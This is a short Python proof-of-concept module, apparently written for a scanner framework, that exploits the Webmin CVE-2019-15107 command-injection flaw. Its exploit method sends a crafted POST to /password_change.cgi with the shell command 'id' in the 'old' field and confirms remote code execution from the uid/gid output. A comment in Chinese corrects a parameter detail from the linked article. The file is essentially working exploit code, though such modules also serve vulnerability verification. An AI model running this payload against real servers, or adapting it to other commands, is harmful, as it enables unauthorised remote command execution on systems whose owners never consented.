from PocUtils import PocType, Severity
from PocUtils.Http import Http
from urllib.parse import urljoin


class Poc:
    def __init__(self):
        self.poc_type = PocType.http
        self.target = ""
        self.severity = Severity.critical
        self.detail = """<https://cloud.tencent.com/developer/article/1987931>

文中有一处错误：new1和new2参数值需相等"""
        self.name = "Webmin CVE-2019-15107"

    def check(self):
        client = Http()
        client.url = self.target
        resp = client.get()
        if "Webmin" in resp.text:
            return True
        else:
            return False

    def exploit(self):
        url = urljoin(self.target, "/password_change.cgi")
        client = Http()
        client.url = url
        client.data = {"user": "123", "pam": "", "expired": "2", "old": "id", "new1": "test2", "new2": "test2"}
        resp = client.post()
        if "id=" in resp.text and "gid=" in resp.text and "groups=" in resp.text:
            return True
        else:
            return False
